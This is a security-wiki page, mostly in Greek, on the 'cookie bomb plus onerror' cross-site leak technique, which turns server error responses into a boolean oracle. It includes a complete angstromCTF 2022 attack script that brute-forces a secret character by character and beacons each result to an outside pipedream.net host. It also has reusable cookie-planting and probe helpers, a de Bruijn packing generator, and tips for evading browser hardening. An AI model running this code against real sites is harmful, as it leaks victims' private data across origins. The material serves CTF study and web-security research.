# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Αυτή η τεχνική συνδυάζει:
- Cookie bombing: γεμίζοντας το πρόγραμμα περιήγησης του θύματος με πολλά/μεγάλα cookies για το target origin έτσι ώστε οι επακόλουθες αιτήσεις να φτάνουν όρια του server/request (request header size, URL size in redirects, κ.λπ.).
- Error-event oracle: probing a cross-origin endpoint with a `<script>` (or other subresource) and distinguishing states with `onload` vs `onerror`.

Βασική ιδέα
- Βρείτε ένα target endpoint της συμπεριφοράς του οποίου διαφέρει για δύο καταστάσεις που θέλετε να δοκιμάσετε (π.χ., search “hit” vs “miss”).
- Βεβαιωθείτε ότι το μονοπάτι “hit” θα ενεργοποιήσει μια βαριά αλυσίδα redirects ή μεγάλο URL ενώ το μονοπάτι “miss” παραμένει σύντομο. Φουσκώστε τα request headers χρησιμοποιώντας πολλά cookies έτσι ώστε μόνο το μονοπάτι “hit” να κάνει τον server να αποτύχει με HTTP error (π.χ., 431/414/400). Το error αντιστρέφει το onerror event και γίνεται oracle για XS-Search.

Πότε δουλεύει αυτό
- Μπορείτε να κάνετε το πρόγραμμα περιήγησης του θύματος να στείλει cookies στον στόχο (π.χ., cookies είναι SameSite=None ή μπορείτε να τα ορίσετε σε first-party context μέσω popup `window.open`).
- Υπάρχει μια λειτουργία της εφαρμογής που μπορείτε να καταχραστείτε για να ορίσετε αυθαίρετα cookies (π.χ., “save preference” endpoints που μετατρέπουν ελεγχόμενα input names/values σε Set-Cookie) ή για να δημιουργήσετε post-auth redirects που ενσωματώνουν attacker-controlled δεδομένα στο URL.
- Ο server αντιδρά διαφορετικά στις δύο καταστάσεις και, με φουσκωμένα headers/URL, η μία κατάσταση ξεπερνά κάποιο όριο και επιστρέφει error response που ενεργοποιεί `onerror`.

Σημείωση σχετικά με τα server errors που χρησιμοποιούνται ως oracle
- 431 Request Header Fields Too Large επιστρέφεται συνήθως όταν τα cookies φουσκώνουν τα request headers; 414 URI Too Long ή κάποιο server-specific 400 μπορεί να επιστραφεί για μακροσκελείς στόχους αιτήματος. Οποιοδήποτε από αυτά έχει ως αποτέλεσμα αποτυχημένο subresource load και ενεργοποιεί onerror. Δείτε [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) για τυπικές αιτίες όπως υπερβολικά cookies.

<details>
<summary>Πρακτικό παράδειγμα (angstromCTF 2022)</summary>

Το παρακάτω script (from a public writeup) καταχράται μια δυνατότητα που επιτρέπει στον attacker να εισάγει αυθαίρετα cookies, και στη συνέχεια φορτώνει ένα cross-origin search endpoint ως script. Όταν το query είναι σωστό, ο server εκτελεί redirect που, σε συνδυασμό με το cookie bloat, υπερβαίνει τα όρια του server και επιστρέφει status error, οπότε το script.onerror εκτελείται· αλλιώς δεν συμβαίνει τίποτα.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Γιατί το popup (`window.open`)?
- Οι σύγχρονοι περιηγητές αποκλείουν όλο και περισσότερο τα third-party cookies. Το άνοιγμα ενός top-level window προς τον στόχο κάνει τα cookies first‑party, οπότε οι απαντήσεις Set-Cookie από τον στόχο θα επιμείνουν, επιτρέποντας το cookie-bomb βήμα ακόμη και με περιορισμούς στα third-party cookies.

2024–2025 notes on cookie availability
- Το rollout του Chrome’s Tracking Protection (Ιανουάριος 2024) ήδη μπλοκάρει third-party cookies για μια τυχαία ομάδα και προβλέπεται να επεκταθεί σε ολόκληρη τη βάση χρηστών μόλις η UK CMA εγκρίνει, οπότε υποθέστε ότι οποιοδήποτε θύμα μπορεί ξαφνικά να χάσει 3P cookies. Αυτοματοποιήστε το fallback: ανιχνεύστε πότε η probe του script αποτυγχάνει χωρίς να φτάσει ποτέ στον στόχο και κάντε διαφανή pivot στο popup/first-party flow. Safari και Firefox ήδη μπλοκάρουν τα περισσότερα third-party cookies εξ ορισμού και τα CHIPS/partitioned cookies σημαίνουν ότι κάθε top-level site έχει τώρα το δικό του jar.
- Χρησιμοποιήστε μια first‑party cookie planting flow (`window.open` + auto-submit σε ένα cookie-setting endpoint) και μετά κάντε probe με ένα subresource που πετυχαίνει μόνο όταν αυτά τα cookies αποστέλλονται. Αν τα third‑party cookies είναι μπλοκαρισμένα, μεταφέρετε το probe σε context same-site (π.χ., τρέξτε το oracle στο popup μέσω ενός same-site gadget και exfiltrate το boolean με `postMessage` ή ένα beacon προς τον server σας), ή εγγράψτε το origin του θύματος στο Chrome’s deprecation trial εάν το ελέγχετε νόμιμα.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

When you need to stuff dozens of cookies from a cross-site context, stage a temporary top-level window and fire a series of oversized form submissions into the vulnerable Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Κάλεσέ το ακριβώς πριν ξεκινήσεις probing ώστε κάθε oracle run να ξεκινά με ένα φρεσκοφουσκωμένο cookie jar.

</details>

Γενικός probing helper
Αν ήδη έχεις τρόπο να ορίσεις πολλά cookies στο target origin (first-party), μπορείς να επαναχρησιμοποιήσεις αυτό το minimal oracle για οποιοδήποτε endpoint όπου η επιτυχία/αποτυχία οδηγεί σε διαφορετικά αποτελέσματα δικτύου (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Εναλλακτικό tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Advanced: de Bruijn–based cookie packing (CTF-proven)
- Όταν η εφαρμογή σας επιτρέπει να ελέγχετε μεγάλες τιμές cookie, μπορείτε να πακετάρετε guesses αποδοτικά προσθέτοντας μια de Bruijn sequence σε κάθε probe. Αυτό διατηρεί το per‑probe overhead μικρό ενώ εξασφαλίζει ότι το heavy branch είναι σταθερά βαρύτερο μόνο για το σωστό prefix. Παράδειγμα generator για |Σ| symbols μήκους n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Ιδέα στην πράξη: ορίστε πολλαπλά cookies των οποίων οι τιμές είναι prefix + deBruijn(k,n). Μόνο όταν το δοκιμαζόμενο prefix είναι σωστό, ο server ακολουθεί το “heavy” μονοπάτι (π.χ. επιπλέον redirect που αντικατοπτρίζει το μεγάλο cookie ή URL), το οποίο σε συνδυασμό με το cookie bloat ξεπερνάει όρια και ενεργοποιεί onerror. Δείτε έναν δημόσιο solver από LA CTF 2024 που χρησιμοποιεί αυτή την προσέγγιση.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- Αυτή η κατηγορία επιθέσεων συζητιέται ευρέως ως “Error Events” XS-Leaks. Το cookie-bomb βήμα είναι απλά ένας βολικός τρόπος να ωθήσετε μόνο ένα branch πάνω από τα όρια του server, παράγοντας ένα αξιόπιστο boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
